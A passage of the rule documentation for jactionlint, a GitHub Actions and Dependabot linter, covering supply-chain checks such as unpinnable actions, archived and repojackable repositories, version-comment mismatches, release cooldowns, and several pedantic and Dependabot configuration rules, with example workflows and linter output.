test.yaml:8:15: warning: action "pre-commit/action@2c7b3805fd2a0fd8c1884dcaebf91fc102a13ecd" is pinned to commit 2c7b3805fd2a, but the pin does not hold: a composite step uses "actions/cache@v4", a ref which can move and not a commit SHA. so what runs can change without a change to this workflow. use an action which pins its dependencies, or fork it and pin them there [unpinnable-action]
  |
8 |       - uses: pre-commit/action@2c7b3805fd2a0fd8c1884dcaebf91fc102a13ecd # v3.0.1
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:10:15: warning: action "actions/jekyll-build-pages@44a6e6beabd48582f863aeeb6cb2151cc1716697" is pinned to commit 44a6e6beabd4, but the pin does not hold: it runs the Docker image "docker://ghcr.io/actions/jekyll-build-pages:v1.0.13", a tag and not a digest. so what runs can change without a change to this workflow. use an action which pins its dependencies, or fork it and pin them there [unpinnable-action]
   |
10 |       - uses: actions/jekyll-build-pages@44a6e6beabd48582f863aeeb6cb2151cc1716697 # v1.0.13
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**What is read.**

- **Only actions pinned to a full commit SHA.** An action pinned to a tag is reported by [`unpinned-uses`](#check-action-format) already.
- **Composite steps**, also those in a `parallel:` group. `uses: owner/repo@v1` (a tag, a branch or a short SHA) and `uses: docker://image:tag` (no `@sha256:` digest) are reported. `uses: ./path` and `uses: $/path` are not followed: they are looked up in the workspace of the job which runs the action at run time, not in the repository of the action, so there is nothing to read.
- **Docker actions.** `runs.image: docker://image:tag` without a digest is reported. An action whose image is built from a `Dockerfile` is not: its `FROM` lines are not read.
- **Two levels.** The steps of the pinned action, and the steps of the commit-pinned actions they use. A deeper chain is not read, and an action which uses itself is read once. The finding names the nested action which has the dependency.
- **A reusable workflow is not followed**, only actions.
- **Nothing is reported when the metadata is not known** (private, 404, rate limit, a deny list): the lookup is counted as skipped, as for the other online rules, see [when GitHub does not answer](./online.md#when-github-does-not-answer). The answer for a commit never changes, so it is kept in the cache whatever its age, see [the cache](./online.md#the-cache).

**Fix.** Use an action which pins its dependencies, or fork it and pin them there, then pin the commit of your fork. A finding is not a statement that the action is unsafe, only that its pin does not freeze what runs.

**Related.** The check is the same as the "unpinnable action" check of [poutine](https://github.com/boostsecurityio/poutine/blob/main/opa/rego/rules/unpinnable_action.rego).

<a id="check-archived-uses"></a>
## Archived repositories (online)

The rule `archived-uses` reports an action or reusable workflow that lives in an archived repository. An archived repository is read-only: nobody fixes the vulnerabilities of the action, or of the dependencies bundled with it. It is an online rule: it runs only with `--online`, see [online checks](./online.md#online-checks).

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the repository is archived
      - uses: example/archived-action@v1
      # OK
      - uses: actions/checkout@v4
```

Output:

```
test.yaml:8:15: warning: action "example/archived-action@v1" is in the archived repository example/archived-action, which is read-only and no longer maintained, so problems in it will not be fixed. replace it with a maintained alternative, or run the commands yourself in a "run:" step [archived-uses]
  |
8 |       - uses: example/archived-action@v1
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The repository of the example is made up: the output comes from recorded answers of the GitHub API.

**Fix.** Replace the action with a maintained one, or with the commands it wraps in a `run:` step (many actions are thin wrappers around the `gh` CLI, which is on the GitHub-hosted runners). There is no automatic fix.

For the well-known archived actions the message names the successor ([zizmor#2028](https://github.com/zizmorcore/zizmor/issues/2028)): `actions-rs/*` (`dtolnay/rust-toolchain` or `cargo ...` in a script step), `crazy-max/ghaction-docker-meta` (`docker/metadata-action`), `nick-invision/retry` (`nick-fields/retry`), `actions/setup-ruby` (`ruby/setup-ruby`), `actions/setup-elixir` (`erlef/setup-beam`), `actions/setup-haskell` (`haskell-actions/setup`), `8398a7/action-slack` (`slackapi/slack-github-action`), `marvinpinto/action-automatic-releases` (`gh release create`), and for `actions/create-release` and `actions/upload-release-asset` the `gh release` command that [`superfluous-actions`](#check-superfluous-actions) names. The table matters only for a repository that the check found archived, and any other gets the general advice.

**Related.** The audit of the same name in zizmor is [`archived-uses`](https://docs.zizmor.sh/audits/#archived-uses); [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-repojacking"></a>
## Repojacking (online)

The rule `repojacking` reports an action or reusable workflow whose owner name anyone can register. `uses: owner/repo@v1` names the owner of the repository, and a user name or an organization name that nobody holds can be registered by anyone. When the owner of an action has deleted the account, or renamed it and let GitHub redirect the old repository name, the name is free: whoever registers it and creates the repository publishes what this workflow runs, with its token and secrets, the next time it starts. It is an online rule: it runs only with `--online`, see [online checks](./online.md#online-checks).

**What is reported.** An action or a reusable workflow when

- the repository does not exist and neither does its owner: `GET /users/{owner}` answers 404, or
- GitHub redirects the repository to another owner (the answer of `GET /repos/{owner}/{repo}` names another `full_name`), and the owner of the old name does not exist any more.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the owner does not exist, so anyone can register it
      - uses: ghost-owner/deploy@v1
      # ERROR: the repository moved and the old owner is gone
      - uses: former-owner/deploy@v1
      # OK: transferred, and the old owner still exists
      - uses: moved-org/deploy@v1
      # OK
      - uses: actions/checkout@v4
```

Output:

```
test.yaml:8:15: warning: action "ghost-owner/deploy@v1" has the owner "ghost-owner", which does not exist on GitHub, so anyone can register that name and publish ghost-owner/deploy under it, and this workflow runs their code. replace it with one of an owner you trust [repojacking]
  |
8 |       - uses: ghost-owner/deploy@v1
  |               ^~~~~~~~~~~~~~~~~~~~~
test.yaml:10:15: warning: action "former-owner/deploy@v1" has moved to new-owner/deploy and the owner "former-owner" no longer exists on GitHub, so anyone can register that name and create the repository former-owner/deploy, which GitHub then serves instead of the redirect, and this workflow runs their code. use the owner "new-owner" instead [repojacking]
   |
10 |       - uses: former-owner/deploy@v1
   |               ^~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The owners of the example are made up: the output comes from recorded answers of the GitHub API.

**Fix.** Replace the action with one of an owner you trust, or use the new owner that the finding names. There is no automatic fix: the new owner may be the right one, or the action may have to go.

**What is not reported.**

- a repository that GitHub does not show: a private repository answers 404 like a missing one, so only a missing *owner* counts;
- a repository that was transferred while its old owner still exists, because only that owner can create the repository again;
- a repository renamed within its owner;
- an action on a GitHub Enterprise Server. The rule works with the API of `api.github.com` only: a Server runs the actions of github.com through GitHub Connect, so its API does not know their owners and an answer "not found" would mean nothing there. Nothing is asked and nothing is reported.

GitHub retires the names of popular repositories, so an owner that no longer exists may not be exploitable for a repository that many people cloned. The API does not tell, and the rule reports what the API shows.

**Requests.** The repository (the same request that the other online rules make, so none more when `archived-uses` or another one runs) and, only when that is a 404 or a redirect to another owner, one `GET /users/{owner}` for each owner of the run. The answers are cached like the others. A failed lookup is skipped and counted.

<a id="check-ref-version-mismatch"></a>
## Version comments of pinned actions (online)

The rule `ref-version-mismatch` reports a hash-pinned action whose version comment does not match the pinned commit. Dependabot and Renovate keep a hash-pinned action up to date by reading the version in the comment after it (`uses: actions/checkout@<sha> # v4.2.2`). When the commit is changed by hand and the comment is not, the comment lies, and the tools may skip it. It is an online rule: it runs only with `--online`, see [online checks](./online.md#online-checks).

**How the comment is read.** A comment gives a version when it starts with one (`v4.2.2`, `4.2.2`, `v4`, `tag=v4.2.2`), as the bots write it; other comments are left alone. The comment matches when a tag with that version points to the pinned commit; the `v` prefix does not matter. A less specific version is not enough: `# v4` on the commit of `v4.2.2` is reported when the tag `v4` points to another commit, because the comment no longer describes what is pinned.

The version can also be written the way [ratchet](https://github.com/sethvargo/ratchet) does it, `# ratchet:actions/checkout@v4.2.2`. The comment is read only when it names the action it follows (`ratchet:exclude` and a comment about another action are left alone). A pinned action without a version comment is not reported by this rule: the pedantic rule [`missing-version-comment`](#check-missing-version-comment) reports it.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # OK: the commit is v4.2.2
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      # ERROR: the commit is v4.2.2, not v3.0.0
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3.0.0
```

Output:

```
test.yaml:10:15: the runner of "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683" action is too old to run on GitHub Actions (checked as "actions/checkout@v3": the version comment "# v3.0.0" says so, and nothing verifies the comment). update the action's version to fix this issue, or the version comment if it is out of date [outdated-action-runner]
   |
10 |       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3.0.0
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:10:15: warning: the version comment "# v3.0.0" does not match the commit pinned in action "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683": tag "v3.0.0" points to commit a12a3943b4bd, but the pinned commit is tagged "v4.2.2". either the comment is stale or the SHA is wrong, so check which one is meant: update the comment, or pin the commit of the version you mean [ref-version-mismatch]
   |
10 |       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3.0.0
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The example output has a second finding, of `outdated-action-runner`: that rule takes the version of a pinned action from the comment, so the stale `# v3.0.0` makes it check `actions/checkout@v3`.

**Fix.** A mismatch has two possible causes: the comment is stale, or the SHA is not the commit that was meant (it was replaced by hand, or by someone else). The commit is what runs, so the fix of this rule rewrites the version in the comment (and only that, words around it stay) to the tag of the pinned commit, `# v3.0.0` to `# v4.2.2`. The fix needs `--online --fix=unsafe`. Review the change like any other: it is wrong when the SHA is the part that has to change. There is no fix when the commit has no tag, or has several versions of the same specificity (`v2.0.1` and `v2.0.2`), or the repository has more tags than were read, because the version to write is then a choice.

**Related.** `--online --fix` can pin tags to commits and add this comment, see [pin tags to commits](./online.md#pin-tags-to-commits-with-online-fix). The audit of the same name in zizmor is [`ref-version-mismatch`](https://docs.zizmor.sh/audits/#ref-version-mismatch); [zizmor parity](./zizmor-parity.md) lists the differences; the part of the audit about a missing comment is [`missing-version-comment`](#check-missing-version-comment).

<a id="check-missing-version-comment"></a>
## Pinned actions without a version comment (pedantic)

The rule `missing-version-comment` (in the `pedantic` profile, as a warning) reports an action or reusable workflow that is pinned to a full commit SHA whose comment names no version. A bare commit SHA tells a reader nothing, and Dependabot and Renovate do not know which release it is: they read the comment after it (`uses: actions/checkout@<sha> # v4.2.2`) to find the newer ones. The rule needs no network. It is the part of the [zizmor audit](https://docs.zizmor.sh/audits/#ref-version-mismatch) that is about a missing comment; a comment that names another version than the commit is the business of [`ref-version-mismatch`](#check-ref-version-mismatch).

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # OK: the comment names the version
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      # ERROR: no comment
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
      # ERROR: the comment names no version
      - uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # speeds up the build
```

Example config:

```yaml
rules:
  missing-version-comment: warning
```

Output:

```
test.yaml:9:15: warning: action "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020" is pinned to a commit but has no comment which names its version. add one like "# v1.2.3" after it: Dependabot and Renovate read it to update the pin, and it tells a reader what the commit is [missing-version-comment]
  |
9 |       - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:11:15: warning: action "actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830" is pinned to a commit but its comment "# speeds up the build" names no version. write the version at its start like "# v1.2.3": Dependabot and Renovate read it to update the pin, and it tells a reader what the commit is [missing-version-comment]
   |
11 |       - uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # speeds up the build
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The example config turns the rule on with `rules: {missing-version-comment: warning}` in the [configuration file](config.md#rules). The `pedantic` profile turns the rule on as well.

**What is reported.** A pin to a full commit SHA that has no comment, or whose comment names no version. The forms of a version comment are the same as for `ref-version-mismatch`: `# v4.2.2`, `# 4.2.2`, `# v4`, `# tag=v4.2.2`, `# v4.2.2 (some note)` and the comment of [ratchet](https://github.com/sethvargo/ratchet), `# ratchet:actions/checkout@v4.2.2`. A comment that has a version somewhere (`# pin@v7.0.1`, `# Release v4.4.1`) is accepted too, because it says which version the pin is. Only a comment that starts with the version is read by `ref-version-mismatch`. A version on the line before the action is not read by any tool and is reported.

**What is not reported.** A comment that starts with the name of a branch that is usually followed (`# main`, `# master`, `# develop`, `# branch=main`): the pin follows the branch on purpose, and its commit is not a release. An action that is not pinned to a commit is the business of `unpinned-uses`, and local actions and Docker images have no version comment.

**Fix.** With `--online --fix` the finding is fixed by adding the comment: the most specific version tag that points to the commit (`# v4.2.2`, not `# v4`), the way [the pin fix](./online.md#pin-tags-to-commits-with-online-fix) names it. The fix is safe, because it only adds a comment. There is no fix when a comment is already there (it may say something else that matters), when no tag of the repository points to the commit (a commit between releases has no version to name), or when the commit has several versions of the same specificity (`v2.0.1` and `v2.0.2`). Without `--online` the finding says that the fix needs it.

<a id="check-action-release-cooldown"></a>
## Release cooldown of actions (online, opt-in)

The rule `action-release-cooldown` reports an action that is at a version younger than a number of days: a pin to a commit, or a reference to a tag. A compromised release of an action is usually found and taken down within days, and a project that waits for a release to age is not hit by it. The rule is the check of the option `--min-age` of [pinact](https://github.com/suzuki-shunsuke/pinact/blob/main/docs/update.md), and the counterpart of [`dependabot-cooldown`](#check-dependabot-cooldown), which asks the same of the updates that Dependabot proposes. It runs only with `--online`, see [online checks](./online.md#online-checks), and only when the configuration has an entry for it, because the number of days is a decision of the project.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: v1.2.0 was released 2 days ago
      - uses: example/fresh@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.2.0
      # OK: v1.1.0 was released more than a week ago
      - uses: example/fresh@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.1.0
```

Example config:

```yaml
rules:
  action-release-cooldown:
    level: warning
    days: 7
```

Output:

```
test.yaml:8:15: warning: action "example/fresh@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" is at a version that is younger than the cooldown of 7 days: v1.2.0 was released 39 hours ago, on 2026-10-11. wait for the version to age before you use it: a compromised release is usually found within days [action-release-cooldown]
  |
8 |       - uses: example/fresh@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.2.0
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The example config is the `rules` entry of the [configuration file](config.md#rules) that turns the rule on, and the example runs with the recorded answers of GitHub.

**Configure.** `days` is the number of days a version must be old (at least 1, and 7 when it is not set). The rule is off until `rules` has an entry for it, as in the example.

**What is reported.** An action at a version younger than `days`. The date of a version is the publication of its release on GitHub (`published_at`, the date a person sees in the list of releases). A tag that has no release has the date of its commit, and so does a commit pinned without a tag. That date is not always the date of the release: a tag that was moved to an older commit looks older than it is, and a commit can be made long before it is released. The finding says which date it used. The version of a pin is the most specific version tag of its commit (`v4.2.2` for `v4`), so that the date is the one of the release, not of the moving tag.

**What is not reported.** A branch is not checked: it moves by design and has no release. A repository with more tags than were read may hide the version tag of a commit, so a pin to it is judged only by a tag written out in full (`v4.2.2`) or by the tag that its comment names when the repository confirms it. Without a lookup that works (no network, a rate limit, a repository left out by `--online-deny`) the action is not reported.

**Fix.** There is no fix: waiting is the fix, and which older version to use is for you to choose.

<a id="check-run-policy"></a>
## Run script policy (pedantic)

The rules `require-shell` and `max-run-lines` (both in the `pedantic` profile, level `error`) report a `run:` step that does not set its shell explicitly and a `run:` script that is longer than you allow. They are off unless you choose that profile. To enable them alone, set them in the [configuration file](./config.md#rule-levels-and-options):

Example input:

```yaml
# select: require-shell,max-run-lines
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: shell is not set
      - run: echo hello
      # OK: shell is set explicitly
      - run: echo hello
        shell: bash
      # ERROR: the script is too long
      - run: |
          echo 1
          echo 2
          echo 3
          echo 4
        shell: bash
  defaults:
    runs-on: ubuntu-latest
    defaults:
      run:
        shell: bash
    steps:
      # OK: the shell is set by 'defaults.run.shell'
      - run: echo hello
```

Example config:

```yaml
rules:
  require-shell: error
  max-run-lines:
    max: 3
```

Output:

```
test.yaml:8:9: shell is not set explicitly. set "shell:" at the step or "defaults.run.shell" because "require-shell" is enabled [require-shell]
  |
8 |       - run: echo hello
  |         ^~~~
test.yaml:13:14: script in "run:" has 4 lines but at most 3 lines are allowed because "max-run-lines" is set. consider moving it to a script file or an action [max-run-lines]
   |
13 |       - run: |
   |              ^
```

<!-- Skip playground link -->

The output keeps only these two rules. To reproduce it, save the example as `.github/workflows/test.yaml`, use the configuration of this section and run `jactionlint --select=require-shell,max-run-lines`.

**`require-shell`.** The rule accepts `shell:` of the step, `defaults.run.shell` of the job and `defaults.run.shell` of the workflow. When the shell is omitted, GitHub Actions runs `bash -e {0}`, while `shell: bash` runs `bash --noprofile --norc -eo pipefail {0}`, so the behavior differs (for example, a failure in the middle of a pipe is not detected). Composite actions always need `shell:`, so the rule does not affect them.

**`max-run-lines`.** The rule counts non-blank lines in a `run:` script. Comment lines are counted. Its default `max` is 100 lines when the rule is enabled without a `max`.

<a id="check-anonymous-definition"></a>
## Workflow and job names (pedantic)

The rule `anonymous-definition` (in the `pedantic` profile, level `warn`) reports workflows without a top-level `name:` and jobs without a `name:`. GitHub shows the file path of a workflow without a name, and the ID of a job without one, in the Actions UI, in the checks of a pull request and in notifications. Names make it clear which definition is running, and a name can be changed without breaking the `needs:` of other jobs, which refer to the job ID.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make
```

Example config:

```yaml
rules:
  anonymous-definition: warn
```

Output:

```
test.yaml:1:1: warning: workflow has no "name:", so GitHub shows its file path in the Actions UI. add a top-level "name:" to make the workflow recognizable [anonymous-definition]
  |
1 | on: push
  | ^~~
test.yaml:3:3: warning: job "build" has no "name:", so the Actions UI shows only its ID. add a "name:" to describe what the job does [anonymous-definition]
  |
3 |   build:
  |   ^~~~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=anonymous-definition`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**What is not reported.** Jobs that call a reusable workflow, since GitHub shows them as `caller / called job`. The workflow `.github/workflows/copilot-setup-steps.yml`, which GitHub runs when the Copilot coding agent starts, is not reported either.

**Fix.** The rule is fixable. `jactionlint --fix` adds `name: <file name without the extension>` to the workflow and `name: <job ID>` to a job, which shows the job exactly as it was shown before. Both fixes are safe.

**Configure.** To turn the rule off for a project, set `anonymous-definition: off` in `rules`. To ignore single findings, use `# jactionlint ignore=anonymous-definition` (see [ignore comments](./ignore.md#ignore-some-errors)).

<a id="ignore-comments-that-suppress-nothing-pedantic"></a>
<a id="check-unused-ignore"></a>
## Ignore comments that suppress nothing

The rule `unused-ignore` (in the `pedantic` profile, level `error`) reports an ignore that did not suppress a finding: a `# jactionlint ignore=...` comment or an entry of `ignores` in the [configuration file](./config.md#durable-ignores). An ignore outlives the code it was written for: the finding was fixed, the line moved, or the rule ID was mistyped. What remains hides nothing and misleads the reader, and it would hide a new finding at the same place. To enable the rule alone, set it in the configuration file:

Example input:

```yaml
# select: shellcheck,unused-ignore
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # jactionlint ignore=shellcheck
      - run: echo hello
      # jactionlint ignore=no-such-rule
      - run: echo bye
```

Example config:

```yaml
rules:
  unused-ignore: error
```

Output:

```
test.yaml:7:28: ignore pattern "shellcheck" did not suppress any error. remove it [unused-ignore]
  |
7 |       # jactionlint ignore=shellcheck
  |                            ^~~~~~~~~~
test.yaml:9:28: ignore pattern "no-such-rule" did not suppress any error. remove it [unused-ignore]
  |
9 |       # jactionlint ignore=no-such-rule
  |                            ^~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=shellcheck,unused-ignore`: a pattern is judged only when the rule it names runs, so `--select` has to name the rule of each pattern next to `unused-ignore`.

**What is not reported.** A pattern for a rule that is off, for an online rule while the online checks are off, or for a rule that could not run (its external command is missing). Such a rule could not have reported anything.

**Fix.** The finding of an ignore comment has a safe fix: `jactionlint --fix` removes the pattern, or the whole comment when no other pattern is left, and keeps the patterns of the comment that were used. An unused pattern of an entry in `ignores` has no fix: remove it from the configuration file yourself.

**Configure.** The option `zizmor` (`rules: {unused-ignore: {zizmor: true}}`) also reports `# zizmor: ignore[...]` comments that suppressed nothing, only for an audit that maps onto a rule of jactionlint that is on. It is meant for the clean-up after a move from zizmor; see [zizmor ignore comments](./ignore.md#zizmor-ignore-comments).

**Related.** Two findings about ignores are always on, from the `correctness` profile: `invalid-ignore-comment` (the comment cannot be parsed) and `expired-ignore` (the `expires` date of an entry in `ignores` has passed, which is reported at the level of the rule, `error` by default, or passes within 14 days, which is reported at the level `info`).

<a id="check-dependabot-syntax"></a>
## Dependabot configuration syntax

The rule `dependabot-syntax` reports a Dependabot configuration that does not follow [version 2 of the options reference](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/dependabot-options-reference). jactionlint checks the Dependabot configuration file `.github/dependabot.yml` (or `.github/dependabot.yaml`) of the repository together with the workflows.

**When the file is checked.** The file is checked when the repository is linted without file arguments, and when it is given explicitly (`jactionlint .github/dependabot.yml`) or with `--stdin-filename .github/dependabot.yml`. The file is recognized by its path only. The rules for workflows are not applied to it, and `.github/workflows/dependabot.yml` is still a workflow.

**What is reported.** Like for workflows, jactionlint reports unknown keys, missing required keys, values of the wrong type and values that are not one of the accepted ones (package ecosystems, schedule intervals and days, update types, registry types, and so on). It also reports:

- a name in `registries` or `multi-ecosystem-group` that is not defined
- an update that sets `multi-ecosystem-group` without `patterns`
- `updates` items for the same package ecosystem, directory and target branch.

Registries accept more keys than the common ones (`url`, `username`, `password`, `key`, `token`, `replaces-base`) depending on their types, and new ones are added over time (for example for OIDC). jactionlint accepts any scalar value for them.

**Configure.** Turn the rule off with `dependabot-syntax: off` under `rules:` in [the config file](./config.md#rules), ignore the findings of the file with `paths:` in [the config file](./config.md#configuration-file), or use an [ignore comment](./ignore.md#ignore-some-errors), like for the other rules.

Example input:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: "/"
    cooldown:
      default-days: 7
    schedule:
      interval: weekly
      # ERROR: "dayy" is a typo of "day"
      dayy: monday
    # ERROR: "label" is a typo of "labels"
    label: [dependencies]
  - package-ecosystem: npm
    directory: "/"
    schedule:
      # ERROR: "hourly" is not a valid interval
      interval: hourly
  # ERROR: schedule is missing
  - package-ecosystem: cargo
    directory: "/"
```

Output:

```
.github/dependabot.yml:10:7: unexpected key "dayy" for "schedule" section. expected one of "cronjob", "day", "interval", "time", "timezone" [dependabot-syntax]
   |
10 |       dayy: monday
   |       ^~~~~
.github/dependabot.yml:12:5: unexpected key "label" for "updates" section. expected one of "allow", "assignees", "commit-message", "cooldown", "directories", "directory", "exclude-paths", "groups", "ignore", "insecure-external-code-execution", "labels", "milestone", "multi-ecosystem-group", "open-pull-requests-limit", "package-ecosystem", "patterns", "pull-request-branch-name", "rebase-strategy", "registries", "reviewers", "schedule", "target-branch", "vendor", "versioning-strategy" [dependabot-syntax]
   |
12 |     label: [dependencies]
   |     ^~~~~~
.github/dependabot.yml:13:5: "cooldown" is not set in this update, so Dependabot applies its implicit cooldown of 3 days. set "cooldown.default-days" to at least 7 to avoid updating to a version right after its release. set "default-days" in the "dependabot-cooldown" rule options of the configuration to turn on the --fix fix [dependabot-cooldown]
   |
13 |   - package-ecosystem: npm
   |     ^~~~~~~~~~~~~~~~~~
.github/dependabot.yml:17:17: schedule interval "hourly" is invalid. expected one of "daily", "weekly", "monthly", "quarterly", "semiannually", "yearly", "cron" [dependabot-syntax]
   |
17 |       interval: hourly
   |                 ^~~~~~
.github/dependabot.yml:19:5: "cooldown" is not set in this update, so Dependabot applies its implicit cooldown of 3 days. set "cooldown.default-days" to at least 7 to avoid updating to a version right after its release. set "default-days" in the "dependabot-cooldown" rule options of the configuration to turn on the --fix fix [dependabot-cooldown]
   |
19 |   - package-ecosystem: cargo
   |     ^~~~~~~~~~~~~~~~~~
.github/dependabot.yml:19:5: "schedule" key is missing in "updates" item [dependabot-syntax]
   |
19 |   - package-ecosystem: cargo
   |     ^~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output also holds two `dependabot-cooldown` findings, for the two updates without a cooldown; the [Dependabot cooldown](#check-dependabot-cooldown) check reports them. `jactionlint --select dependabot-syntax` reports only the findings of this rule.

<a id="check-dependabot-cooldown"></a>
## Dependabot cooldown

The rule `dependabot-cooldown` reports an update of `dependabot.yml` whose `cooldown.default-days` is less than the minimum, which is 7 days. A cooldown makes Dependabot wait until a new version is some days old before it proposes the update. That limits the damage of a compromised release, which is usually taken down within days, and of releases that turn out to be broken. Without `cooldown.default-days` Dependabot applies an implicit cooldown of 3 days, which is less than the minimum.

The rule is in the `default` profile. zizmor reports the same with its `dependabot-cooldown` audit ([jactionlint and zizmor](./zizmor-parity.md)).

Example input:

```yaml
version: 2
updates:
  # ERROR: no cooldown, so Dependabot applies its implicit 3 days
  - package-ecosystem: github-actions
    directory: "/"
    schedule:
      interval: weekly
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
    cooldown:
      # ERROR: 2 days is less than the minimum of 7
      default-days: 2
  - package-ecosystem: cargo
    directory: "/"
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
```

Output:

```
.github/dependabot.yml:4:5: "cooldown" is not set in this update, so Dependabot applies its implicit cooldown of 3 days. set "cooldown.default-days" to at least 7 to avoid updating to a version right after its release. set "default-days" in the "dependabot-cooldown" rule options of the configuration to turn on the --fix fix [dependabot-cooldown]
  |
4 |   - package-ecosystem: github-actions
  |     ^~~~~~~~~~~~~~~~~~
.github/dependabot.yml:14:21: "cooldown.default-days" is 2, which is less than the minimum 7 days. set it to at least 7. set "default-days" in the "dependabot-cooldown" rule options of the configuration to turn on the --fix fix [dependabot-cooldown]
   |
14 |       default-days: 2
   |                     ^
```

<!-- Skip playground link -->

**What is reported.** The finding is at the update when it has no `cooldown`, at `cooldown` when it has no `default-days`, and at the value otherwise.

**What is not reported.** The other keys of `cooldown` (`semver-major-days`, `include` and so on) are not checked. An update whose version updates are turned off is skipped: `open-pull-requests-limit: 0`, or an `ignore` of `dependency-name: "*"` without `versions` (and without `update-types`, or with all three semver update types).

**Configure.** The rule has two options under `rules:` in [the config file](./config.md#rules).

| Option | Default | Effect |
| --- | --- | --- |
| `days` | 7 | The minimum number of days that `cooldown.default-days` must be. |
| `default-days` | none | The number of days that `--fix` writes as `cooldown.default-days`. Without it the findings have no fix. |

Set both to change the minimum and to let `--fix` write the cooldown:

```yaml
rules:
  dependabot-cooldown:
    days: 14
    default-days: 14
```

jactionlint never makes up the number of days, which is why the fix needs the `default-days` option. With it, `--fix` adds a `cooldown` section, adds `default-days` to a `cooldown` section without it, or raises a smaller value. The fix is offered only when the number is between `days` and 90, the largest number that Dependabot accepts, and not when the update is written in flow style (`{...}`). To turn the check off, set `dependabot-cooldown: off`.

<a id="check-dependabot-execution"></a>
## Dependabot insecure code execution

The rule `dependabot-execution` reports an update of `dependabot.yml` that sets `insecure-external-code-execution: allow`. Some package managers run code of the dependencies (build scripts, `setup.py`, plugins) while they resolve versions. Dependabot does not run it unless an update allows it. In an automated job the code runs without a human looking at it first, and it may find the credentials that Dependabot has for private registries.

The rule is in the `default` profile. zizmor reports the same with its `dependabot-execution` audit ([jactionlint and zizmor](./zizmor-parity.md)).

Example input:

```yaml
version: 2
updates:
  - package-ecosystem: pip
    directory: "/"
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
    # ERROR: Dependabot may run code of the dependencies it updates
    insecure-external-code-execution: allow
```

Output:

```
.github/dependabot.yml:10:39: "insecure-external-code-execution: allow" lets Dependabot run code from the dependencies it updates, which can expose the credentials Dependabot uses. remove it or set it to "deny" [dependabot-execution]
   |
10 |     insecure-external-code-execution: allow
   |                                       ^~~~~
```

<!-- Skip playground link -->

**Fix.** Remove the key or set it to `deny`, which is the default. `--fix=unsafe` sets the value to `deny`. The fix is unsafe because updates of dependencies that need the code to run stop working.

**Configure.** If you need `allow` for a registry, ignore the finding for that file with `paths:` in [the config file](./config.md#configuration-file), or with an [ignore comment](./ignore.md#ignore-some-errors).

<a id="check-hardcoded-registry-credentials"></a>
## Dependabot registry credentials in plain text

